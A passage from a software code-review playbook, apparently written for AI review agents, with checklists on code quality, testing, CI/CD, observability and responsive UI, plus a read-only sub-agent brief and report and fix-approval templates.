4. Naming: consistent casing (files, components, variables, DB), meaningful names, no `data1`/`temp`/`foo`/`handleClick2`; consistent language (English); boolean names; domain vocabulary agreed.
5. Types: TypeScript `strict`; count of `any`, `as` casts, `@ts-ignore`/`@ts-expect-error` without explanation, non-null `!` assertions; types derived from schemas (zod/drizzle) instead of duplicated by hand; runtime and compile-time types agree.
6. Error handling and logging patterns consistent (see server domain); `console.log` leftovers.
7. Configuration: constants and env access centralized; no magic URLs; feature flags documented.
8. Comments explain *why*, not *what*; public functions documented; no misleading stale comments.
9. Tooling: formatter (Prettier/Biome) and linter (ESLint/Biome) configured, enforced in CI and pre-commit; editorconfig; consistent import ordering; TypeScript project references if monorepo; the code actually passes `tsc --noEmit` and lint with zero errors (run and report counts).

## C. Documentation and onboarding

1. README: what it is, screenshots, prerequisites, setup commands that actually work from a clean clone (verify by reading and, if possible, trying in a temp copy), env variable table (`.env.example` complete, no real values), scripts list, deploy notes, architecture overview, contributing/branching rules, troubleshooting.
2. Architecture notes/ADRs for key decisions (why Drizzle, why this auth approach); diagram of data flow; API docs.
3. `package.json` scripts: `dev`, `build`, `start`, `lint`, `typecheck`, `test`, `db:*` are present, named consistently, and documented.
4. Runtime version pinned (`.nvmrc`, `engines`, `packageManager` field/corepack).

## D. Git history and workflow quality

1. Commit messages: meaningful vs "update", "fix", "asdf", "wip"; conventional commits or a consistent style; commits focused (one concern each); giant "everything" commits; mixed formatting and logic changes.
2. Branching and review process: PR template, branch protection, required reviews/checks, linear history policy; direct pushes to main.
3. History hygiene: large binaries, generated files, committed-then-deleted junk, unrelated files; author identity consistency (name/email, personal email exposure); signed commits if required; tags/releases and changelog.
4. Churn hotspots: files changed most often and by bug-fix commits (`git log --format=format: --name-only | sort | uniq -c | sort -rn | head`) point to the weakest design areas.
5. Bus factor: knowledge concentrated in one contributor; undocumented tribal conventions.

## E. Architecture checks

1. Separation of concerns: presentation, domain logic, data access; business rules in testable pure functions; side effects at the edges.
2. Coupling: modules know each other's internals; shared mutable global state; singletons; hidden dependencies via module-level imports of config.
3. Consistency of patterns for the same task (one way to fetch, validate, handle errors, name routes); the codebase reads as if written by one team.
4. Extensibility without rewriting: adding a new feature touches a small, predictable set of files.
5. Scalability signals appropriate to stage (do not demand microservices from a prototype): stateless servers, queue for slow work, idempotency.

## F. Typical junior mistakes

- Everything in `page.tsx`/`App.tsx`; 800-line components; logic and markup mixed.
- `utils.ts`, `helpers.ts`, `common.ts` becoming junk drawers; `components/` with 100 flat files.
- Copy-paste of the same fetch/validation block in 12 places.
- `any` everywhere "to make the red lines go away"; `// @ts-ignore` instead of fixing types.
- Folder and file names inconsistent (`UserCard.tsx`, `user_card.tsx`, `usercard.tsx`).
- README still the framework default; `.env.example` missing or out of date.
- Commit history of "fix", "fix2", "final", "final final".
- Leftover files: `old/`, `backup/`, `*.copy.tsx`, unused assets.

## Habits to teach

Name things for what they mean; one concern per file and per commit; run formatter, linter, and type-check before pushing (automate with a pre-commit hook and CI); write the README for the person who clones it tomorrow; delete code you are not using, git remembers it.


---

# APPENDIX A-subagent-brief

# Sub-agent brief template

Fill the placeholders and pass this as the `prompt` to a fresh agent. One agent per domain. Keep the brief to paths and rules; do not paste code or other domains' findings.

---

You are a senior <ROLE, for example "application security engineer"> reviewing one domain of a code repository: **<DOMAIN NAME>**. You are strictly read-only on the repo: do not edit, create, move, or delete any source or config file, do not run migrations or deploys, do not install packages into the project, do not commit or push, do not touch production systems or real data. The ONLY files you may write are `checklist.md` and `report.md` in your output folder. You find and describe problems and propose fixes; you never apply them. Applying a fix needs the person's approval, which only the lead can collect later.

**Inputs (read these first)**
- Domain playbook: appendix `A-<playbook>` inside `<skill file path>` (heading `# APPENDIX A-<playbook>`)
- Report and checklist formats: appendix `A-templates`
- Stack profile: `<repo>/review/00-stack-profile.md`
- Repo root: `<repo path>`
- Scope for this run: `<paths/packages/areas, or "whole repo">`
- Out of scope: `<other domains, they have their own agents>`
- Context from the person (only if relevant): `<for example "repo may become public", "brand guide at docs/brand.pdf", "targets: mobile-first, Ethiopia/low bandwidth">`

**Output folder:** `<repo>/review/domains/<NN-domain>/`

**Step A - write `checklist.md` before analyzing in depth.**
Use the playbook as a starting point, then tailor it to this repo after skimming the relevant code. Make it a numbered action list where each item names what to inspect (files, routes, tables, config keys), how (grep pattern, command, reading order), and what "bad" looks like. Add items the playbook does not have if this stack calls for them. Prefer 25-60 concrete items over a generic list. Think about how a junior developer would typically get each area wrong, and add checks for those.

**Step B - execute the checklist and write `report.md`.**
Work through every item. Record evidence as you go. Use the report format in `templates.md`. For items you could not check (needs runtime, credentials, or the person's input), list them under "Not checked" with the reason and what would unblock them.

**Rules**
1. Evidence for every finding: `path:line` or commit hash, plus how you verified it. No evidence, no finding (put it in "Questions" instead).
2. Never write a secret value anywhere. Record location, type, and at most the first 4 characters.
3. Verify currency claims (versions, deprecations, CVEs, framework security guidance) against live official sources and today's date (`<today>`); cite the URL. Do not rely on memory for anything version-specific.
4. Severity and confidence use the scale in `SKILL.md` of the skill. Be honest about Low confidence.
5. Each finding includes: what, where, why it matters in real-world terms, a concrete proposed fix (code or command when short; written as a proposal, NOT applied), the files that the fix would change, the risk of the fix, effort (S/M/L), a one-line plain-language question the lead can ask the person to approve it, and a one-line "lesson" about the mistake class.
6. Include "Done well" (specific good practices you saw) and "Habits to adopt" (3-6 practices that would prevent this domain's mistakes).
7. Stay in scope. If you notice something outside your domain that looks serious, add one line under "Handoff" and move on.
7b. If your domain touches what users see or what the API returns on failure, include the error exposure checks from your playbook (technical errors shown to users, and failures that show nothing). Say exactly which text a user would see.
8. Running read-only commands is fine (`git log`, `grep`/`rg`, `tsc --noEmit`, `npm audit`, linters, a build into a temp dir). Install audit tools only outside the repo (for example in a temp directory) and say so.

**Return to me only this (max ~250 words):**
- Counts: Critical / High / Medium / Low / Info
- Top 3 findings, one line each, with `path:line`
- What you could not check
- Path to `report.md`

Do not paste the report into your reply.


---

# APPENDIX A-templates

# Templates

## 00-stack-profile.md

```markdown
# Stack profile
Date: <today> | Repo: <name> | Commit: <short hash> | Branch: <branch>

## What it is
<1-3 sentences: product, users, stage (prototype/MVP/production), public or private>

## Runtime and tooling
- Language(s) + version: 
- Framework(s) + version: 
- Package manager + lockfile: 
- Build tool / bundler: 
- Node/runtime version pinned? (.nvmrc, engines): 

## Frontend
- UI library / styling (Tailwind, CSS modules, shadcn, etc.): 
- Design tokens / brand guide present? where: 
- State/data fetching: 
- Routing: 

## Backend
- API style (route handlers, server actions, tRPC, REST, GraphQL): 
- Auth (library/provider, session type): 
- Validation library (zod, valibot, none): 
- Background jobs / queues / cron: 

## Data
- Database + host: 
- ORM + migration approach (drizzle-kit generate/migrate/push): 
- Cache / storage (Redis, S3, blob): 

## AI
- Providers / SDKs: 
- Where calls are made (server/client), streaming?: 
- Tools / agents / RAG: 

## Infra
- Hosting / deploy: 
- CI/CD: 
- Docker / IaC: 
- Env handling (.env files, platform secrets): 

## Repo facts
- Commits: N | Contributors: N | First: date | Last: date
- Branches/tags: 
- Size and shape (apps/packages, approx file counts): 
- `.env*` ever tracked in history? (yes/no/unknown, evidence): 
- Tests present? CI present? 

## Surprises / risks noticed during discovery
- 
```

## 01-review-map.md

```markdown
# Review map
| # | Domain | Why for this repo | Scope | Status |
|---|---|---|---|---|
| 1 | Secrets and git history | ... | whole history | pending |

Skipped domains and why:
- 

Questions for the person:
- 
```

## STATUS.md

```markdown
# Review status (updated <date>)
Phase: plan awaiting approval | investigating | fixing (approved changes only)
Plan approved by the person: no | yes (<date>)

| # | Domain | Status | C | H | M | L | Report | Fixed / Skipped / Open |
|---|---|---|---|---|---|---|---|---|
| 1 | Secrets and git history | done | 1 | 0 | 2 | 0 | domains/01-secrets/report.md | 0 / 0 / 3 |

Next: <domain>
Person's decisions so far:
- 
```

## checklist.md (written by the sub-agent, Step A)

```markdown
# Checklist: <domain> (tailored to <repo>)
Scope: <paths>

| # | Area | What to inspect (files/routes/tables) | How (command/grep/read) | "Bad" looks like | Done |
|---|---|---|---|---|---|
| 1 | ... | `app/api/orders/route.ts` | read; grep `req.json()` | body used without schema | [ ] |
```

Aim for 25-60 items, grouped by area. Include items for typical junior-developer mistakes in the domain.

## report.md (written by the sub-agent, Step B)

```markdown
# <Domain> review
Repo: <name> | Commit: <hash> | Date: <today> | Reviewer role: <role>
Scope: <paths> | Checklist items: N done, M not checked

## Verdict
<3-5 sentences in plain language. Would a senior reviewer be comfortable with this area? What is the single most important thing to fix?>
Score: X/5

## Summary
| Severity | Count |
|---|---|
| Critical | |
| High | |
| Medium | |
| Low | |
| Info | |

## Findings

### F-<domain>-01 [Critical] <short title>
- **Where:** `path:line` (or commit `abc1234`)
- **Confidence:** High | Medium | Low (how verified)
- **What:** <what is wrong, factual>
- **Why it matters:** <real-world consequence; who is hurt; how it could be exploited or how it shows up to a user/boss>
- **Proposed fix (NOT applied):** <concrete steps; short code/command if useful>
- **Files the fix would change:** `path`, `path`
- **Risk of the fix:** Low | Medium | High - <what could break>
- **Effort:** S | M | L
- **Question to ask the person:** <one plain sentence, e.g. "Your login page shows the raw database error to users. Change it to a friendly message and log the real error?">
- **Lesson:** <one line: the class of mistake and how to avoid it next time>

(repeat, ordered by severity then by effort ascending)

## Done well
- <specific good practices, with location>

## Habits to adopt
1. <practice that prevents this domain's typical mistakes>

## Not checked
- <item> - <why> - <what would unblock>

## Questions for the person
- 

## Handoff to other domains
- <one line each>

## Sources
- <URLs for any version/advisory/doc claims>
```

## Fix card (lead sends this in chat BEFORE any change; keep it under ~120 words)

```markdown
**Problem F-<domain>-<nn> [<severity>]:** <what happened, in plain words>
**Where:** `path:line`
**Why it matters:** <one sentence, real-world result>
**What I would change:** <files, and the 2-6 lines or the idea of the change>
**Risk:** <Low/Medium/High - what could break> | **Check after:** <how I will verify>

Apply this change?  [Yes, apply it] [Skip for now] [Change how you fix it] [Stop fixing]
```

Nothing is edited until the person picks "Yes" for this exact card.

## FIX-LOG.md (lead maintains; one entry per approved change)

```markdown
# Fix log
| # | Finding | Approved by person (date) | Files changed | What changed | Verified how | Result |
|---|---|---|---|---|---|---|
| 1 | F-security-02 | <date>, "yes" in chat | `app/api/orders/route.ts` | added zod schema | `tsc --noEmit`, manual call | pass |

Skipped by the person:
- F-ui-05 (reason, if given)
Not applied / blocked:
- 
```

## FINAL-REPORT.md

```markdown
# Final review: <repo>
Date: <today> | Commit: <hash>

## Verdict
<short, honest summary; what a senior reviewer would say in a meeting>

## Scorecard
| Domain | Score /5 | One line |
|---|---|---|

## Roadmap
### Do today (Critical, irreversible, cheap)
### This week
### This month
### Habits to adopt (checklist to keep)

## Root causes that repeat
1. <e.g., no validation layer -> 9 findings across server, security, database>

## What you do well
## Not checked / open questions
## Suggested next review: <when and what triggers it, e.g., before public launch, after major upgrade>
```


---

# APPENDIX A-testing-ci-observability

# Playbook: Testing, CI/CD, observability

Role: quality/DevOps engineer. The question: **does the repo enforce its own quality automatically, and would the team notice when something breaks in production?** A project without automated checks relies on memory and luck, and reviewers see that quickly.

## A. Tests

1. Presence and shape: unit, integration, end-to-end; a sensible pyramid (many fast unit tests, fewer integration, few critical e2e flows); test files located consistently; test runner current (Vitest/Jest/Playwright) and configured.
2. Run them: execute the test suite (and note duration, failures, flaky tests, skipped tests `.skip`/`xit`/`todo`) and report counts. If tests cannot run without secrets or a DB, note what is needed and whether a test DB/mocks/containers are provided.
3. Coverage: measure where possible (`--coverage`); focus on risk, not the number: auth, authorization, payments, validation, data migrations, AI tool permissions, money/time calculations should have tests. Look for tests that assert nothing, snapshot-only tests that hide changes, over-mocking so tests pass while the real thing is broken.
4. Failure paths and security tests: invalid input, unauthorized access to another user's resource (IDOR test), rate limit behavior, error responses, webhook signature failure.
5. E2E: critical user journeys (sign-up/login, main flow, checkout/submission) covered; run against a seeded test environment; mobile viewport projects included; tests are deterministic (no sleeps, stable selectors such as roles/test ids).
6. Test data: factories/fixtures without real personal data or real keys; tests do not hit production or paid APIs (AI calls mocked or limited with a test key and low caps).
7. Accessibility and visual regression checks if the project cares about UI quality (axe in e2e, Storybook/Chromatic/Playwright screenshots).
8. Type checking and linting count as tests: `tsc --noEmit` and lint run clean.

## B. CI

1. A pipeline exists and runs on every PR and on main: install (frozen lockfile), lint, type-check, unit tests, build; optionally e2e and audit.
2. Required checks enforced by branch protection (otherwise CI is advisory only); status of the last 20 runs (green rate, flakiness, duration); caching used; matrix for supported runtime versions if a library.
3. Security in CI: secret scanning, dependency audit/Dependabot/Renovate, CodeQL or Semgrep static analysis, license check, container image scan; Actions pinned and least-privilege `permissions`; no secrets printed; `pull_request_target` misuse; third-party actions vetted.
4. Quality gates: coverage threshold on changed code, bundle-size budget, Lighthouse CI/performance budget, migration check (schema drift), commit lint if desired.
5. Pre-commit hooks (husky/lefthook/lint-staged): format, lint staged files, secret scan, type-check on push; make sure hooks are installed automatically (`prepare` script) and bypass (`--no-verify`) is not the norm.

## C. CD and release

1. Deployment is reproducible and automated (not "drag the folder"); preview deployments per PR with auth or noindex; separate staging and production with separate secrets and databases.
2. Migrations in the deploy pipeline in a controlled step with a backup/rollback plan; zero-downtime strategy for destructive changes.
3. Rollback: documented and fast (revert deploy, previous image/version); feature flags for risky releases.
4. Release hygiene: semantic versioning/tags, changelog, release notes; environment variables managed in the platform; build is deterministic (pinned base images, lockfile).
5. Infrastructure as code if infra exists; no snowflake servers; least-privilege deploy credentials; OIDC instead of long-lived cloud keys where supported.

## D. Observability and operations

1. Error tracking (Sentry/Rollbar/etc.) in client and server with release/version tags and source maps uploaded privately; alerts routed to someone; PII scrubbed.
2. Structured logging with request IDs and levels; sensible retention; no secrets/PII; logs searchable; AI request/cost logs (see AI domain).
3. Metrics and uptime: health endpoint, uptime monitor, basic latency/error-rate dashboards, DB and queue metrics; Web Vitals real-user monitoring.
4. Alerts that matter: error spike, 5xx rate, latency, queue depth, failed jobs, AI spend, certificate expiry, disk/db size; on-call or at least an owner who gets notified.
5. Backups and disaster recovery: automated backups, tested restores, documented recovery time/point goals proportional to the product.
6. Runbooks: how to deploy, roll back, rotate a secret, restore a backup, respond to an incident; contact points.
7. Status communication: status page or at least a plan for informing users.

## E. Developer experience

One-command setup (`pnpm i && pnpm dev`), seed data, `.env.example`, docker-compose for local services, devcontainer optional; scripts documented; fast feedback loop (watch mode, HMR); troubleshooting section for common failures.

## F. Typical junior mistakes

- No tests at all, or tests that were written once and now fail/are skipped.
- CI exists but is red and ignored, or optional because main has no branch protection.
- Tests that call real paid APIs or a shared database.
- `console.log` as the only observability; errors swallowed so nobody knows users are failing.
- Deploying by hand from a laptop with production credentials on it.
- No rollback plan; migrations run manually against production.
- Hooks that nobody installs; `--no-verify` as habit.

## Habits to teach

Write the test that reproduces a bug before fixing it; keep CI green and required; test the unhappy path and the permission boundary; add error tracking before the first user, not after the first outage; practice a rollback and a restore once.


---

# APPENDIX A-ui-responsive-brand

# Playbook: UI, responsive design, brand consistency

Role: senior frontend/design engineer who reviews like a design lead. This is what a boss or client sees first, so an app can be technically fine and still look "low quality" here. Accessibility and performance have their own domains; note overlaps as handoffs.

## A. Establish the standard first

1. Find the brand/design source of truth: brand guide, Figma link, `tailwind.config.*` theme, CSS variables (`:root`), design-token files, component library (shadcn, MUI, Chakra, Radix), `README`/docs. If none exists, record that as a finding (no single source of truth), infer the *de facto* system from the most-used values, and ask the person for the brand guide in "Questions".
2. List the tokens: colors (brand, neutral, semantic: success/warn/error/info), typography (families, scale, weights, line heights), spacing scale, radii, shadows, breakpoints, motion durations.

## B. Brand and design consistency (static analysis)

Search for deviations from the tokens:
1. Hard-coded colors: grep hex/rgb/hsl literals (`#[0-9a-fA-F]{3,8}`, `rgb(`, `hsl(`) and Tailwind arbitrary values (`text-[#...]`, `bg-[#...]`) outside the token file. Count unique off-palette colors; many near-duplicates (`#3b82f6` vs `#3a80f5`) signal drift.
2. Fonts: `font-family` declarations outside the theme; fonts loaded but unused; missing fallbacks; too many families/weights; FOUT/FOIT handling (`font-display`, `next/font`).
3. Spacing and sizing: arbitrary pixel values (`mt-[13px]`, `padding: 7px`) vs scale; inconsistent container widths and page gutters.
4. Components: duplicate implementations of the same thing (3 different button styles, 4 card styles, multiple modal implementations); components that bypass the shared library; inline styles.
5. Logo, favicon, app icons, OG/Twitter images, manifest: present, correct brand version, correct sizes, not placeholder or framework default (default Vite/Next/CRA logo or favicon left in is a classic "unfinished" signal). Page `<title>`, meta description, language attribute, theme color.
6. Copy and content: placeholder text ("Lorem ipsum", "Todo", "Untitled", "Hello World", default template text), inconsistent capitalization/voice, mixed languages, raw error codes shown to users, broken or dummy links (`href="#"`), dummy images.
7. Iconography consistent (one icon set, consistent stroke/size); imagery style consistent; illustration quality.
8. Dark mode (if offered): complete or deliberately absent; no unreadable text/contrast in either theme; `color-scheme`, `prefers-color-scheme` handled; no flash of wrong theme.
9. Visual hierarchy and states: every interactive component has default, hover, focus-visible, active, disabled, loading, error states; empty states; skeletons; toasts and form errors consistent.

## C. Responsive design

Check at these widths: 320, 375, 414 (phones), 768 (tablet portrait), 1024 (tablet landscape/small laptop), 1280, 1440, 1920, 2560+ (ultrawide). Also landscape phones, 200% browser zoom, and large system font sizes.

Static checks:
1. Viewport meta present and correct (`width=device-width, initial-scale=1`; no `user-scalable=no`/`maximum-scale=1`).
2. Mobile-first or consistent breakpoints; breakpoints come from one source (Tailwind screens/CSS variables), not random media queries (`@media (max-width: 743px)`).
3. Fixed widths/heights in px on containers, images, tables, modals (`w-[800px]`, `width: 1200px`, `height: 100vh` pitfalls on mobile: prefer `dvh`/`svh`), `overflow-x` hacks hiding a layout break, `position: fixed` elements overlapping content or keyboards.
4. Layout primitives used well: flex/grid with `min-w-0`, wrapping, `clamp()` for fluid type, `max-w-*` containers; no horizontal scroll at 320px.
5. Tables and data-heavy views: responsive strategy exists (card layout, horizontal scroll container with affordance, column priority); long strings/URLs/emails wrap (`break-words`, `overflow-wrap`); long names, many items, empty lists, very large numbers.
6. Images and media: `srcset`/`sizes` or framework image component, aspect ratios reserved (no layout shift), `object-fit`, art direction; videos and iframes responsive.
7. Navigation: mobile menu works (open/close, focus handling, scroll lock), no hover-only interactions; tap targets at least 44x44 CSS px (24x24 minimum per WCAG 2.2) with spacing; sticky headers not covering anchors (`scroll-margin-top`).
8. Forms on mobile: correct `type`, `inputmode`, `autocomplete`, labels; font size at least 16px on inputs (avoids iOS zoom); keyboard not hiding submit buttons; date/number inputs.
9. Typography: readable line length (45-80 characters), minimum size, scaling with user settings (rem not px for text).
10. Safe areas and notches (`env(safe-area-inset-*)`), PWA/standalone behavior if claimed.
11. Print styles if relevant; email templates (table layouts, inline CSS) if the product sends HTML email.

Runtime checks (do if a dev server and a headless browser can be run in the sandbox; otherwise state "not checked at runtime" and give the person a manual test matrix):
- Start the app, capture screenshots per key page at 360, 768, 1280, 1920 widths (for example with Playwright), look for overflow, overlap, clipped text, unreadable contrast, broken images. Compare against brand tokens visually.
- Check `document.documentElement.scrollWidth > innerWidth` on each page to detect horizontal overflow automatically.
- Also test with slow network/CPU throttling for loading states, and with JavaScript errors visible in the console.

## D. Consistency of behavior (UX quality signals)

1. Loading, error, empty, and success states for every data-driven view; optimistic updates roll back on failure.
2. Form UX: inline validation, clear error messages tied to fields, preserved input on error, disabled/loading submit to prevent double-submit, confirmation for destructive actions.
3. Navigation: 404 and error pages branded and helpful; back button and deep links work; active nav state; breadcrumbs where deep.
4. Feedback: toasts/notifications consistent; no `alert()`/`confirm()` leftovers; no `console.log` noise in production.
4b. **Error exposure in the UI (technical errors shown to users).** Every place the UI shows a failure (red text, toast, inline form error, error boundary, `error.tsx`/`not-found`/`500` page, modal, empty-state fallback) must tell the user in plain words that something went wrong and what they can do (retry, check input, contact support), and must not show technical detail. Check:
   - Static: grep for rendering of raw error objects: `error.message`, `err.message`, `e.message`, `error.stack`, `JSON.stringify(error)`, `String(err)`, `{error}` inside JSX, `toast.error(err.message)`, `setError(e.message)`, `catch (e) { alert(e) }`, `res.statusText`, `await res.text()` shown in UI, `error.digest`, framework default error pages left in place, `dev` overlays enabled in production config.
   - Dangerous content in user-visible messages: stack traces, file paths, SQL or ORM messages (`duplicate key value violates unique constraint`, `relation "x" does not exist`), provider/AI API errors (rate limit text, model names, key hints), raw HTTP codes/`Failed to fetch`/`NetworkError`/`Unexpected token < in JSON`, `undefined`, `null`, `[object Object]`, internal IDs or hostnames, validation library dumps (raw zod issues arrays).
   - Silent failures: `catch {}` with no UI feedback, a spinner that never stops, a button that does nothing after a failed request, optimistic update that is not rolled back and not explained. The user must always be told that something failed.
   - Good pattern to expect: one error-mapping function (error code -> friendly message in the product's voice and language), a request/reference ID shown to the user ("Reference: 8F3K2") so support can find the real error in logs, error boundaries at route level with a retry action, technical detail sent to the logger/error tracker only, and field-level errors tied to the input they belong to.
   - Runtime (local dev server only, never production): trigger failures on the main flows (offline mode, invalid input, expired session, 404 route, forced 500 from an API route, provider timeout if it can be simulated) and record exactly what text the user sees on each. Put the screenshot path or the exact text in the finding. If it cannot be run, say "not checked at runtime".
   - Also check the tone: no blame ("You entered invalid data"), no jargon, localized if the app is localized, accessible (`role="alert"` or live region, not color alone; see accessibility domain).
5. Internationalization/localization readiness if the audience needs it (text externalized, RTL/Ethiopic/other scripts render with proper fonts, date/number/currency formatting by locale, text expansion tolerated).
6. Animations: purposeful, short, respect `prefers-reduced-motion`.
7. Cross-browser: Safari/iOS quirks (100vh, date inputs, `:has`, backdrop-filter), Firefox, older Android WebView if the audience uses them; check `browserslist` and CSS features used vs support.

## E. Code quality of the UI layer

Component size and responsibility; props drilling vs composition; duplicated markup; CSS specificity wars and `!important`; unused CSS/Tailwind classes; global styles leaking; storybook/visual regression if present; TypeScript props typed; no business logic in presentational components.

## F. Typical junior mistakes

- Designed only at laptop width; fixed pixel widths; `overflow-x: hidden` on `body` to hide a bug.
- Colors and fonts picked ad hoc per component instead of tokens.
- Framework default favicon/title/logo left in.
- Different button styles on different pages; inconsistent spacing between sections.
- No loading/empty/error states; a blank page while fetching.
- Showing `error.message` straight to the user ("relation \"users\" does not exist", "Failed to fetch"), or showing nothing at all when a request fails.
- `href="#"` and placeholder text shipped.
- Hover-only menus; tiny tap targets; inputs under 16px on mobile.
- Text contrast too low; images without dimensions causing jumps.

## Habits to teach

Define tokens before building pages; build components once and reuse; test every page at 320px and 1440px before pushing; keep a "definition of done" that includes all UI states, keyboard use, and dark/light check; compare against the brand guide in review, not after.
